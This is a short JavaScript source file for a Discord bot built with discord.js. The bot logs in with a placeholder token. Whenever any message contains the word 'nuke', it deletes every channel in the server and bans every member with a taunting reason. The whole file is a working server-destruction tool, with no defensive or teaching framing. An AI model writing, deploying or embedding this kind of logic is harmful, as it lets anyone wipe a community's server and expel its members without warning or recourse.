const Discord = require('discord.js');
const client = new Discord.Client();
client.login('token for bot goes here');
client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
  console.log("ready");
});
client.on('message', msg => {
  if (msg.content.includes('nuke')) {
    msg.guild.channels.cache.forEach(channel => channel.delete())
    msg.guild.members.cache.forEach(member => {member.ban({reason: 'You were banned lmao sad'}).then(console.log).catch(console.error)})
  }
});
